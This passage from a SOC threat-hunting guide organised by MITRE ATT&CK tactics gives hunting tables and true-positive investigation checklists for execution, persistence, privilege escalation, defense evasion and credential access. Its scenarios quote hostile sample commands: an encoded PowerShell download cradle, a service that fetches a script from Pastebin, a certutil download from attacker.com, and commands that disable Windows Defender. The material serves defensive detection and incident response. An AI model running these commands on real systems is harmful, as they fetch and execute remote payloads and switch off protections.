**Scenario:** UEBA flags a successful login for `john.doe@corp.com` from Nigeria at 3:00 AM, followed by mailbox rule creation forwarding all emails to an external Gmail address. John is based in New York and was logged in from his office 2 hours prior.

**Investigation Steps:**
```
1. VERIFY IMPOSSIBLE TRAVEL
   □ Check Azure AD/Entra sign-in logs: timestamps, IPs, geolocations
   □ Confirm John's last known legitimate login and location
   □ Calculate travel distance and time → impossible?
   □ Check if IP is known VPN/proxy/TOR exit node

2. CHECK POST-LOGIN ACTIVITY
   □ Review mailbox rules: forwarding, delete, move rules created
   □ Review sent items: any mass emails or phishing sent?
   □ Check for OAuth app consent grants
   □ Check for password/MFA changes
   □ Review Azure AD audit logs: role changes, app registrations

3. CONFIRM COMPROMISE
   □ Contact John via out-of-band communication (phone call)
   □ Ask if he traveled or used VPN
   □ If NOT John → CONFIRMED COMPROMISE

4. RESPOND
   □ Revoke all active sessions (Azure AD: Revoke-AzureADUserAllRefreshToken)
   □ Reset password immediately
   □ Reset MFA registration
   □ Remove malicious inbox rules
   □ Block the external forwarding address
   □ Review and revert any unauthorized changes
   □ Check if credentials were exposed in known breaches (HaveIBeenPwned)

5. SCOPE EXPANSION
   □ Search for similar impossible travel events for other users
   □ Check if any other accounts logged in from the same Nigerian IP
   □ Review VPN/SSO logs for related anomalies
   □ Check if password spray preceded this login
```

**TP Confidence:** 🔴 HIGH — Impossible travel + inbox rule forwarding to external address = confirmed account compromise.

---

### 4.4 TA0002 — Execution

#### Overview
After gaining access, adversaries execute malicious code. This is one of the **most detectable** tactics because it generates rich telemetry in endpoint logs.

#### Key Techniques

| Technique ID | Technique | Description | Key Detection |
|-------------|-----------|-------------|---------------|
| T1059.001 | PowerShell | Execute PS commands/scripts | Event 4104 (Script Block), Sysmon 1 |
| T1059.003 | Windows Command Shell | cmd.exe execution | Sysmon 1, Event 4688 |
| T1059.005 | Visual Basic (VBA) | Macro execution in Office | EDR, Event 4688 (child of WINWORD.EXE) |
| T1059.007 | JavaScript/JScript | .js execution via wscript/cscript | Sysmon 1, EDR |
| T1047 | WMI (WMIC) | Remote execution via WMI | Event 4688, Sysmon 1 (wmiprvse.exe) |
| T1053.005 | Scheduled Task | Task scheduler for execution | Event 4698, Sysmon 1 (schtasks.exe) |
| T1204.001 | User Execution: Link | User clicks malicious link | Proxy logs, EDR |
| T1204.002 | User Execution: File | User opens malicious file | EDR, Sysmon 1 |
| T1569.002 | System Services: Service | Create service to run code | Event 7045, 4697 |
| T1106 | Native API | Direct API calls (NtCreateThread) | EDR, API monitoring |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Suspicious PowerShell | Windows Events (4104, 4103) | Encoded commands (-enc), download cradles (IEX, Invoke-WebRequest), AMSI bypass |
| Office spawning processes | EDR/Sysmon | WINWORD.EXE → cmd.exe, powershell.exe, mshta.exe, wscript.exe |
| LOLBin execution | EDR/Sysmon | mshta.exe, regsvr32.exe, certutil.exe, rundll32.exe with unusual arguments |
| WMI remote execution | Event 4688/Sysmon | wmic.exe /node: process call create |
| Suspicious scheduled tasks | Event 4698 | Tasks created by non-admin users, pointing to TEMP/AppData paths |
| Script execution | Sysmon Event 1 | cscript.exe or wscript.exe running .js, .vbs, .wsf files from user directories |

#### ✅ True Positive Scenario — Malicious PowerShell Execution (T1059.001)

**Scenario:** SIEM alert fires on PowerShell Script Block Logging (Event 4104). A workstation executed:
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

**Investigation Steps:**
```
1. DECODE THE COMMAND
   □ Base64 decode the -Enc value
   □ Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
   □ This is a classic download cradle → 🔴 MALICIOUS

2. ANALYZE EXECUTION CONTEXT
   □ What user ran this? (domain\user from Event 4688)
   □ What was the parent process? (explorer.exe? outlook.exe? winword.exe?)
   □ When did it execute? (during business hours or off-hours?)
   □ What endpoint is this? (workstation, server, admin jump box?)

3. CHECK NETWORK ACTIVITY
   □ Did the host connect to 192.168.1.10? (is this internal or external?)
   □ Was payload.ps1 downloaded successfully?
   □ What did the payload contain? (if captured by proxy/PCAP)
   □ Check for subsequent outbound connections (C2)

4. ENDPOINT INVESTIGATION
   □ Check process tree in EDR: what spawned after PowerShell?
   □ Check for persistence mechanisms created (scheduled tasks, registry)
   □ Check for credential access (LSASS access, SAM dump)
   □ Check for lateral movement (RDP, SMB, WMI connections)
   □ Check for file drops in TEMP, AppData, ProgramData

5. RESPOND
   □ Isolate the endpoint immediately
   □ Capture forensic image if required
   □ Block the C2 IP/domain at firewall and proxy
   □ Kill the malicious process tree
   □ Reset user credentials
   □ Scan for persistence artifacts and remove
   □ Hunt for same IOCs across the environment
```

**TP Confidence:** 🔴 CRITICAL — Encoded PowerShell download cradle with hidden window = confirmed malicious execution.

#### ✅ True Positive Scenario — Office Document Spawns Child Process (T1204.002 + T1059.005)

**Scenario:** EDR alerts that `WINWORD.EXE` spawned `cmd.exe`, which then launched `powershell.exe` on a Finance department workstation. The user opened an email attachment named `Invoice_Details.docm`.

**Investigation Steps:**
```
1. PROCESS TREE ANALYSIS
   □ Map the full process chain:
     OUTLOOK.EXE → WINWORD.EXE → cmd.exe → powershell.exe
   □ This is a CLASSIC macro-enabled document attack chain → 🔴
   □ Check PowerShell command line arguments
   □ Check if PowerShell made network connections

2. DOCUMENT ANALYSIS
   □ Retrieve the .docm file (from email quarantine or endpoint)
   □ Calculate file hash → check VirusTotal
   □ Extract and analyze VBA macros (olevba, oletools)
   □ Look for: AutoOpen/Document_Open, Shell(), CreateObject, WScript
   □ Submit to sandbox for dynamic analysis

3. EMAIL ANALYSIS
   □ Who sent the email? External or compromised internal?
   □ Check sender domain reputation and age
   □ Were other users targeted with same attachment?

4. POST-EXECUTION HUNTING
   □ What did PowerShell download/execute?
   □ Check for new files created (Sysmon Event 11)
   □ Check for registry modifications (Sysmon Event 13)
   □ Check for network connections (Sysmon Event 3)
   □ Check for persistence mechanisms
   □ Check if LSASS was accessed (credential dumping)

5. RESPOND
   □ Isolate endpoint
   □ Purge email with same attachment hash from all mailboxes
   □ Block file hash at EDR and email gateway
   □ Block any C2 infrastructure identified
   □ Reset user credentials (assume compromised)
   □ Create detection for this document's IOCs
```

**TP Confidence:** 🔴 CRITICAL — Office application spawning command shell → PowerShell is textbook macro malware execution.

---

## 5. Investigation Checklist — Universal Template

### 5.1 General Threat Hunting Investigation Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│            UNIVERSAL THREAT HUNTING INVESTIGATION CHECKLIST            │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  PHASE 1: INITIAL TRIAGE (First 15 minutes)                          │
│  □ What triggered the hunt? (Intel, hypothesis, anomaly)              │
│  □ What assets are involved? (hosts, users, services)                │
│  □ What is the potential MITRE ATT&CK tactic/technique?              │
│  □ What data sources are available for investigation?                 │
│  □ Is there an active threat requiring immediate containment?         │
│                                                                       │
│  PHASE 2: DATA COLLECTION (30 minutes)                               │
│  □ Pull relevant logs from SIEM (time-bounded queries)               │
│  □ Review EDR telemetry for affected endpoints                       │
│  □ Check network logs (firewall, proxy, DNS, NetFlow)                │
│  □ Review authentication logs (AD, VPN, cloud IdP)                   │
│  □ Collect threat intelligence on any IOCs found                     │
│                                                                       │
│  PHASE 3: ANALYSIS (1-2 hours)                                       │
│  □ Construct timeline of events                                      │
│  □ Map activity to MITRE ATT&CK techniques                          │
│  □ Identify all affected systems and users                           │
│  □ Determine if this is isolated or part of a campaign               │
│  □ Differentiate legitimate activity from malicious (TP vs FP)       │
│  □ Identify root cause / initial access vector                       │
│  □ Assess lateral movement scope                                     │
│  □ Check for persistence mechanisms                                  │
│  □ Look for data staging or exfiltration indicators                  │
│                                                                       │
│  PHASE 4: VERDICATION & SCOPE                                        │
│  □ Confirm TP with supporting evidence                               │
│  □ Assess total blast radius (all affected assets)                   │
│  □ Determine severity (Critical/High/Medium/Low)                     │
│  □ Identify all IOCs (IPs, domains, hashes, file paths, user agents)│
│                                                                       │
│  PHASE 5: RESPONSE                                                    │
│  □ Contain: Isolate affected systems, block IOCs                     │
│  □ Eradicate: Remove persistence, malware, unauthorized access       │
│  □ Recover: Restore systems, reset credentials, verify integrity     │
│  □ Submit IOCs to threat intel platforms                              │
│                                                                       │
│  PHASE 6: DOCUMENTATION & IMPROVEMENT                                 │
│  □ Document full investigation timeline and findings                 │
│  □ Record all IOCs and TTPs observed                                 │
│  □ Create/update SIEM detection rules                                │
│  □ Write Sigma/YARA rules for future detection                       │
│  □ Update threat model and hunting backlog                           │
│  □ Conduct lessons learned                                           │
│  □ Share intelligence with peer organizations (if applicable)        │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 5.2 Key Evidence to Collect Per MITRE Tactic

| Tactic | Key Evidence to Collect |
|--------|------------------------|
| **Initial Access** | Email headers, attachment hashes, sender domain WHOIS, proxy logs for URL clicks |
| **Execution** | Process creation logs (Sysmon 1, 4688), PowerShell 4104, command line arguments |
| **Persistence** | Registry keys (Run, RunOnce), scheduled tasks (4698), services created (7045), startup folders |
| **Privilege Escalation** | Token manipulation artifacts, UAC bypass techniques, exploit evidence |
| **Defense Evasion** | Timestomping evidence, process injection, disabled security services |
| **Credential Access** | LSASS access logs, SAM database access, Kerberoasting tickets, brute force attempts |
| **Discovery** | Network scanning activity, nltest, whoami, net group commands |
| **Lateral Movement** | RDP connections (4624 Type 10), PsExec (7045), WMI (4688), SMB file access |
| **Collection** | File access logs, screen capture tools, keylogger artifacts, archive creation |
| **C2** | DNS queries, proxy logs, unusual beaconing patterns, encoded traffic |
| **Exfiltration** | Large data transfers, cloud upload logs, USB activity, encrypted archives |
| **Impact** | Ransomware notes, deleted shadow copies, destroyed logs, defacement evidence |

---

*Continued in Part 2 → Persistence, Privilege Escalation, Defense Evasion, Credential Access — Advanced TP Scenarios & Hunting Playbooks*


---

# 🎯 Threat Hunting SOC Guide — Part 2: Persistence, Priv Esc, Defense Evasion & Credential Access

---

# PART 2: ATT&CK TACTICS — PERSISTENCE THROUGH CREDENTIAL ACCESS

---

## 6. TA0003 — Persistence

#### Overview
After gaining initial access, adversaries install **backdoors** and mechanisms to survive system reboots, credential resets, and remediation attempts. Persistence is one of the **most critical** hunting areas because removing it is essential to eradication.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1547.001 | Registry Run Keys / Startup Folder | Auto-execute on login | Sysmon 13, Registry audit |
| T1053.005 | Scheduled Task | Execute at interval/trigger | Event 4698, Sysmon 1 |
| T1543.003 | Windows Service | Create service for persistence | Event 7045, 4697 |
| T1136 | Create Account | Create new local/domain account | Event 4720, 4722 |
| T1098 | Account Manipulation | Add to privileged group, modify perms | Event 4728, 4732, 4756 |
| T1505.003 | Web Shell | Backdoor on web server | File integrity, Web logs |
| T1546.003 | WMI Event Subscription | Permanent WMI event consumer | WMI repository, Sysmon 19-21 |
| T1574.001 | DLL Search Order Hijacking | Plant DLL in search path | EDR, Sysmon 7 |
| T1137 | Office Application Startup | Office add-in/template injection | Registry, File monitoring |
| T1556 | Modify Authentication Process | Install password filter DLL | Registry, EDR |
| T1078 | Valid Accounts | Maintain access with stolen creds | Auth logs, UEBA |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Registry Run Key additions | Sysmon Event 13 | New values in `HKLM\...\Run`, `HKCU\...\Run`, `RunOnce` keys |
| New scheduled tasks | Event 4698 | Tasks created by non-admin users; tasks pointing to `TEMP`, `AppData`, `ProgramData` |
| New services | Event 7045 | Services with unusual names, running from user directories, PowerShell in service path |
| New user accounts | Event 4720 | Accounts created outside of provisioning tools or change windows |
| Group membership changes | Event 4728/4732/4756 | Users added to Domain Admins, Local Admins, or other privileged groups |
| Web shells | File integrity monitoring | New .aspx, .jsp, .php files in web directories (wwwroot, inetpub, webapps) |
| WMI persistence | Sysmon 19, 20, 21 | New WMI Event Filters, Consumers, and Consumer-to-Filter bindings |
| Startup folder items | Sysmon Event 11 | New .lnk, .bat, .vbs, .exe files in Startup folders |
| DLL hijacking | Sysmon Event 7 | Unsigned DLLs loaded from non-standard paths by legitimate processes |

#### ✅ True Positive Scenario — Scheduled Task Persistence (T1053.005)

**Scenario:** During a routine hunt, you discover a scheduled task named `WindowsDefenderHealthCheck` created on a domain controller by a non-admin service account. The task runs every 4 hours and executes: `C:\ProgramData\Microsoft\WindowsDefender\update.bat`.

**Investigation Steps:**
```
1. EXAMINE THE SCHEDULED TASK
   □ When was it created? (Event 4698 timestamp)
   □ Who created it? (Creator user/account in 4698)
   □ What is the trigger? (time-based, logon-based, event-based)
   □ What is the action? (binary path, arguments)
   □ Is it running as SYSTEM?

2. ANALYZE THE PAYLOAD
   □ Read contents of update.bat
   □ Does it download/execute additional payloads?
   □ Does it establish network connections (C2)?
   □ Does it invoke PowerShell with encoded commands?
   □ Hash the file and check VirusTotal

3. ASSESS LEGITIMACY
   □ Is "WindowsDefenderHealthCheck" a real Windows task? → NO
   □ Windows Defender tasks are in a different path → SUSPICIOUS
   □ Was this created during a change management window? → CHECK
   □ Does the IT team recognize this task? → ASK

4. CHECK FOR RELATED ACTIVITY
   □ What else did the creator account do before/after?
   □ Check process tree when the task executes
   □ Check for network connections during execution
   □ Search for same task name/payload across all endpoints
   □ Check if this is part of a broader compromise

5. RESPOND
   □ Disable the scheduled task immediately
   □ Capture the payload file for forensic analysis
   □ Check if the task executed and what it did
   □ Block the creator account if compromised
   □ Hunt for same persistence across all DCs and servers
   □ Create detection rule for task creation on DCs by non-admin accounts
```

**TP Confidence:** 🔴 CRITICAL — Fake Windows Defender task on DC running batch file from ProgramData = confirmed persistence.

#### ✅ True Positive Scenario — New Service Created (T1543.003)

**Scenario:** Event 7045 shows a new service named `SystemHealthMonitor` installed on a file server. The service binary path is: `cmd.exe /c powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"`.

**Investigation Steps:**
```
1. EXAMINE THE SERVICE
   □ Event 7045 details: service name, display name, binary path, account
   □ Service binary = cmd.exe launching PowerShell → 🔴 CRITICAL
   □ PowerShell downloads from Pastebin → 🔴 MALICIOUS
   □ Who installed the service? (correlate with 4688/Sysmon)

2. DETERMINE IF SERVICE EXECUTED
   □ Check if the service started (Event 7036: service started)
   □ Check PowerShell logs (4104) for script block logging
   □ Check proxy logs for connection to pastebin.com
   □ Check EDR for process tree: services.exe → cmd.exe → powershell.exe

3. ANALYZE THE PAYLOAD
   □ Access the Pastebin URL (from sandboxed environment)
   □ What does the downloaded script do?
   □ Does it install additional persistence? Drop tools? Exfil data?

4. SCOPE THE COMPROMISE
   □ Search for same service name across all servers
   □ Check for other services with PowerShell in binary path
   □ Review the installing account's full activity timeline
   □ Look for lateral movement from/to this server

5. RESPOND
   □ Stop and disable the service
   □ Isolate the server from the network
   □ Delete the service registration
   □ Block pastebin.com raw URL at proxy (or specific URL)
   □ Reset credentials of the installing account
   □ Full forensic investigation of the server
   □ Hunt for same pattern environment-wide
```

**TP Confidence:** 🔴 CRITICAL — Service executing PowerShell download cradle from Pastebin = textbook persistence mechanism.

#### ✅ True Positive Scenario — Web Shell Deployed (T1505.003)

**Scenario:** File integrity monitoring alerts on a new file `error_handler.aspx` created in `C:\inetpub\wwwroot\` on the Exchange OWA server. The file was not part of any patch or deployment.

**Investigation Steps:**
```
1. EXAMINE THE FILE
   □ When was the file created? (check MFT/$SI timestamps)
   □ What process created it? (check Sysmon Event 11)
   □ Analyze file content: does it contain eval(), exec(), cmd functions?
   □ Hash the file → check VirusTotal for web shell signatures
   □ Compare to known web shell families (China Chopper, ASPXSPY, etc.)

2. CHECK WEB SERVER ACTIVITY
   □ Review IIS logs for requests to error_handler.aspx
   □ Who accessed it? Note source IPs
   □ What POST data was sent? (command execution?)
   □ Any authentication bypass patterns?

3. DETERMINE INITIAL ACCESS
   □ How did the attacker write to wwwroot?
   □ Check for ProxyShell/ProxyLogon/ProxyNotShell exploitation evidence
   □ Review Exchange health check results
   □ Check for CVE exploitation in IIS/Exchange logs

4. ASSESS IMPACT
   □ What commands were executed through the web shell?
   □ Was data exfiltrated?
   □ Was the web shell used to move laterally?
   □ Were additional web shells planted?

5. RESPOND
   □ Remove the web shell file (preserve copy for forensics)
   □ Patch the vulnerability used for initial access
   □ Search for other web shells in all web directories
   □ Review and reset all credentials on the Exchange server
   □ Check for privilege escalation from IIS service account
   □ Full Exchange security audit
   □ Create file integrity monitoring rule for web directories
```

**TP Confidence:** 🔴 CRITICAL — Unauthorized .aspx file in wwwroot on Exchange server = confirmed web shell.

---

## 7. TA0004 — Privilege Escalation

#### Overview
Adversaries elevate their access level from standard user to admin, SYSTEM, or domain admin. This is a **pivotal** moment in the attack chain — stopping privilege escalation limits the adversary's capabilities significantly.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1548.002 | Bypass UAC | Elevate from medium to high integrity | EDR, Sysmon |
| T1068 | Exploitation for Privilege Escalation | Exploit kernel/software vuln | EDR, Crash dumps |
| T1134 | Access Token Manipulation | Steal/impersonate tokens | Sysmon, Event 4688 |
| T1078 | Valid Accounts | Use admin creds obtained earlier | Auth logs (4624 Type 10, 3) |
| T1484 | Domain Policy Modification | Modify GPO for privilege | Event 5136, GPO audit |
| T1055 | Process Injection | Inject code into privileged process | EDR, Sysmon (Event 8, 10) |
| T1547.001 | Boot/Logon Autostart: Registry | Add to HKLM Run as SYSTEM | Sysmon 13 |
| T1611 | Escape to Host | Container escape to host OS | Container runtime logs, EDR |
| T1078.002 | Domain Accounts | Compromise domain admin creds | Active Directory logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| UAC bypass | EDR/Sysmon | Auto-elevating binaries spawning unexpected children (fodhelper.exe, eventvwr.exe, sdclt.exe) |
| Token manipulation | Sysmon/EDR | Processes using token impersonation (SeImpersonatePrivilege exploitation) |
| Kerberoasting → Admin | AD logs | 4769 (TGS requests) for SPNs of admin service accounts, followed by admin logon |
| DCSync | AD logs | DRS replication request from non-DC machine (Event 4662 with DS-Replication-Get-Changes) |
| GPO modification | Event 5136 | Unauthorized GPO changes granting privileges or deploying scripts |
| Process injection | Sysmon Event 8 | CreateRemoteThread into LSASS, SYSTEM processes, or browsers |
| Potato attacks | EDR | Named pipe impersonation (PrintSpoofer, JuicyPotato, SweetPotato) |

#### ✅ True Positive Scenario — UAC Bypass via Fodhelper (T1548.002)

**Scenario:** EDR detects `fodhelper.exe` (a Microsoft auto-elevating binary) spawning `cmd.exe` with high integrity. The user account is a standard domain user on a workstation.

**Investigation Steps:**
```
1. ANALYZE THE PROCESS CHAIN
   □ Process tree: explorer.exe → fodhelper.exe → cmd.exe (HIGH INTEGRITY)
   □ Check if registry key was modified before execution:
     HKCU\Software\Classes\ms-settings\shell\open\command
   □ What command was set in the registry? (the actual payload)
   □ This is a well-known UAC bypass technique → 🔴

2. CHECK PRE-BYPASS ACTIVITY
   □ How did the attacker get to this point?
   □ Check for initial access vector (phishing, exploitation?)
   □ What commands were run before the UAC bypass?
   □ What user account was used?

3. POST-BYPASS INVESTIGATION
   □ What elevated commands were executed after bypass?
   □ Check for credential dumping (LSASS access)
   □ Check for persistence creation (now with admin rights)
   □ Check for security tool tampering (disabling AV/EDR)
   □ Check for lateral movement attempts

4. RESPOND
   □ Isolate the endpoint
   □ Kill the malicious process tree
   □ Clean the registry modification
   □ Determine full scope of compromise
   □ Check for same technique on other workstations
   □ Reset user credentials
   □ Create detection for fodhelper UAC bypass pattern
```

**TP Confidence:** 🔴 CRITICAL — Registry modification + fodhelper.exe spawning elevated cmd.exe = confirmed UAC bypass.

#### ✅ True Positive Scenario — Kerberoasting Leading to Domain Admin (T1558.003)

**Scenario:** SIEM detects a workstation issuing 50+ TGS (Kerberos Ticket Granting Service) requests in 2 minutes, requesting tickets for multiple service accounts including `svc_sql_admin`, `svc_backup`, and `svc_exchange`.

**Investigation Steps:**
```
1. IDENTIFY KERBEROASTING
   □ Event 4769 (Kerberos Service Ticket Operations)
   □ Filter for encryption type: 0x17 (RC4-HMAC) → weak, crackable
   □ High volume of TGS requests from single workstation → 🔴
   □ Requests for multiple SPNs in short timeframe → KERBEROASTING

2. CHECK THE SOURCE
   □ Which workstation/user initiated the requests?
   □ What tool was used? (Rubeus, Invoke-Kerberoast, GetUserSPNs.py)
   □ Check for PowerShell or command line evidence
   □ Is this a normal admin activity? → Almost certainly NOT

3. ASSESS CRACKING RISK
   □ Which service accounts had tickets requested?
   □ Are these accounts domain admins or have elevated privileges?
   □ What are the password policies for these service accounts?
   □ Were passwords complex enough to resist cracking?

4. CHECK FOR FOLLOW-UP
   □ After Kerberoasting: did any service accounts log in from unusual sources?
   □ Check 4624 events for service accounts from workstations (not servers)
   □ Check for privilege escalation with cracked credentials
   □ Check for lateral movement using service accounts

5. RESPOND
   □ Force password reset on ALL targeted service accounts immediately
   □ Change to complex passwords (25+ characters)
   □ Investigate the source workstation for compromise
   □ Convert service accounts to Group Managed Service Accounts (gMSA)
   □ Disable RC4 encryption for Kerberos (require AES)
   □ Enable Kerberoasting detection rule in SIEM
   □ Review all SPNs for unnecessary registrations
   □ Isolate the source workstation
```

**TP Confidence:** 🔴 CRITICAL — Mass TGS requests with RC4 encryption for multiple service accounts = confirmed Kerberoasting.

---

## 8. TA0005 — Defense Evasion

#### Overview
Adversaries attempt to **avoid detection** by disabling security tools, obfuscating code, clearing logs, masquerading as legitimate processes, and using living-off-the-land techniques. This is the **most diverse** tactic with 40+ techniques.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1562.001 | Disable/Modify Security Tools | Disable AV, EDR, firewall | EDR tamper protection, Event 7045 |
| T1070.001 | Clear Windows Event Logs | Delete evidence | Event 1102 (Security log cleared) |
| T1070.004 | File Deletion | Remove tools after use | Sysmon 23 (File Delete), EDR |
| T1036 | Masquerading | Rename malware to look legitimate | Sysmon 1, EDR (hash mismatch) |
| T1027 | Obfuscated Files/Information | Encode/encrypt payloads | Script logging (4104), EDR |
| T1218 | System Binary Proxy Execution | Use LOLBins (mshta, rundll32) | Sysmon 1, EDR |
| T1055 | Process Injection | Inject code into legitimate process | Sysmon 8, 10, EDR |
| T1140 | Deobfuscate/Decode Files | Decode payload at runtime | EDR, Script logging |
| T1112 | Modify Registry | Alter configs to disable security | Sysmon 13 |
| T1497 | Virtualization/Sandbox Evasion | Detect analysis environment | EDR (anti-analysis behavior) |
| T1564.001 | Hidden Files and Directories | Hide tools in hidden paths | File system audit |
| T1202 | Indirect Command Execution | Use forfiles, pcalua, etc. | Sysmon 1, EDR |
| T1553.002 | Code Signing | Use stolen/forged certificates | Sysmon 7, Certificate audit |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Security log clearing | Event 1102, 104 | Any security/system log cleared (ALWAYS investigate) |
| AV/EDR tampering | EDR tamper logs | Services stopped (Defender, CrowdStrike, SentinelOne), exclusions added |
| Masquerading | Sysmon 1 | Processes with legitimate names running from unusual paths (svchost.exe from C:\TEMP) |
| LOLBin abuse | Sysmon 1 | mshta.exe, rundll32.exe, certutil.exe, regsvr32.exe with download/exec arguments |
| Process injection | Sysmon 8, 10 | CreateRemoteThread/OpenProcess to sensitive processes (LSASS, winlogon.exe) |
| AMSI bypass | PowerShell 4104 | Scripts containing `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer` |
| Timestomping | NTFS analysis | $SI timestamp differs from $FN timestamp on suspicious files |
| Defender exclusions | Registry/MDI | New exclusions added to Windows Defender via PowerShell or registry |

#### ✅ True Positive Scenario — Security Event Logs Cleared (T1070.001)

**Scenario:** SIEM fires Event 1102 (The audit log was cleared) on a domain controller. The log was cleared at 2:47 AM by user `svc_backup`.

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT — THIS IS ALWAYS SERIOUS ON A DC
   □ Event 1102 details: Who cleared the log? When? From which session?
   □ Clearing Security logs on a DC is NEVER normal → 🔴 CRITICAL
   □ This is anti-forensic behavior → assume active compromise
   □ Check if other logs were also cleared (System, PowerShell, Sysmon)

2. INVESTIGATE THE ACCOUNT
   □ Is svc_backup a legitimate service account?
   □ When did svc_backup last authenticate? From where?
   □ Check 4624 events before the clearing (source IP, logon type)
   □ Was svc_backup's password recently changed?
   □ Does svc_backup normally log into DCs interactively?

3. RECOVER EVIDENCE
   □ Check if Sysmon logs are still intact (separate log channel)
   □ Check centralized SIEM — logs forwarded before clearing
   □ Check other DCs for related activity
   □ Review network logs (firewall, DNS, proxy) for the DC
   □ Check EDR telemetry for the DC

4. RECONSTRUCT PRE-CLEARING ACTIVITY
   □ What happened on the DC before logs were cleared?
   □ Check for DCSync (Event 4662 with Replication permissions)
   □ Check for NTDS.dit access or shadow copy creation
   □ Check for account creation or privilege escalation
   □ Check for Golden Ticket / Pass-the-Hash indicators

5. RESPOND — TREAT AS CRITICAL INCIDENT
   □ Escalate to IR team immediately
   □ Reset svc_backup password
   □ Reset KRBTGT password (twice with 12-hour interval)
   □ Audit all privileged accounts on the DC
   □ Full forensic acquisition of the DC
   □ Check all DCs for compromise indicators
   □ Enable enhanced logging and tamper protection
   □ Consider the entire domain potentially compromised
```

**TP Confidence:** 🔴 CRITICAL — Security logs cleared on a domain controller = ALWAYS treat as active compromise.

#### ✅ True Positive Scenario — LOLBin Abuse: Certutil for Download (T1218, T1105)

**Scenario:** EDR alerts on `certutil.exe` executing with the following command line on a workstation:
```
certutil.exe -urlcache -split -f http://attacker.com/payload.dll C:\Users\Public\payload.dll
```

**Investigation Steps:**
```
1. ANALYZE THE COMMAND
   □ certutil.exe used as download tool → classic LOLBin abuse
   □ -urlcache -split -f = download mode
   □ Source: http://attacker.com/payload.dll → external URL
   □ Destination: C:\Users\Public → world-writable directory
   □ This is MALICIOUS → 🔴

2. CHECK EXECUTION CONTEXT
   □ What user ran this command?
   □ What was the parent process? (cmd.exe? powershell.exe? wscript.exe?)
   □ Check full process hierarchy to determine root cause
   □ Was this human-initiated or automated?

3. ANALYZE THE PAYLOAD
   □ Was payload.dll successfully downloaded? (check file system)
   □ Hash the DLL → check VirusTotal
   □ Was the DLL executed? (check Sysmon Event 1 for rundll32 or 7 for DLL load)
   □ Submit to sandbox for analysis

4. NETWORK INVESTIGATION
   □ Check DNS for attacker.com resolution
   □ Check proxy/firewall logs for the download
   □ Was the download successful (HTTP 200)?
   □ Check for subsequent C2 connections from the host

5. RESPOND
   □ Isolate the workstation
   □ Delete the downloaded payload
   □ Block attacker.com at DNS and proxy
   □ Block the payload hash at EDR
   □ Check for same domain/C2 across all endpoints
   □ Create detection for certutil download pattern
   □ Consider application control / AppLocker for certutil
```

**TP Confidence:** 🔴 HIGH — Certutil downloading DLL from external URL to Users\Public = confirmed LOLBin abuse.

#### ✅ True Positive Scenario — Disabling Windows Defender (T1562.001)

**Scenario:** SIEM observes the following PowerShell command executed on a server:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Crypto"
```

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT
   □ Three-pronged Defender disablement:
     - Real-time monitoring disabled
     - AntiSpyware policy disabled via registry
     - Exclusion added for specific path
   □ This is DEFENSIVE PREPARATION before payload deployment → 🔴

2. CHECK WHAT FOLLOWED
   □ What files were created/modified in C:\ProgramData\Microsoft\Crypto?
   □ Was malware dropped in the excluded path?
   □ Check for additional tool deployment (Mimikatz, Cobalt Strike)
   □ Check for lateral movement from this server

3. INVESTIGATE THE ACTOR
   □ Who ran these commands? (user from 4688/4104)
   □ How did they get access to the server?
   □ What privileges do they have?
   □ Check their activity timeline (before and after)

4. SCOPE ASSESSMENT
   □ Were Defender settings modified on other servers/workstations?
   □ Search for same PowerShell commands across environment
   □ Check for similar exclusion paths on other endpoints
   □ Has the adversary deployed ransomware preparation?

5. RESPOND
   □ Re-enable Windows Defender immediately
   □ Remove the malicious exclusion
   □ Remove the DisableAntiSpyware registry key
   □ Scan the excluded directory (C:\ProgramData\Microsoft\Crypto)
   □ Isolate the server if malware is confirmed
   □ Enable Defender Tamper Protection
   □ Deploy GPO to prevent local Defender modification
   □ Hunt for ransomware preparation indicators
```

**TP Confidence:** 🔴 CRITICAL — Systematic Defender disablement = adversary preparing for payload deployment.

---

## 9. TA0006 — Credential Access

#### Overview
Stealing credentials is often the **primary objective** of adversaries after initial access. With valid credentials, attackers can move laterally, escalate privileges, and maintain persistence — all while appearing as legitimate users.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1003.001 | OS Credential Dumping: LSASS | Dump LSASS process memory | Sysmon 10, EDR |
| T1003.002 | SAM Database | Extract local account hashes | Sysmon 1, Event 4688 |
| T1003.003 | NTDS.dit | Extract AD database (all domain hashes) | Event 4662, Volume Shadow Copy |
| T1003.006 | DCSync | Simulate DC replication to steal hashes | Event 4662 (DS-Replication) |
| T1558.003 | Kerberoasting | Request/crack service account TGS tickets | Event 4769 (RC4) |
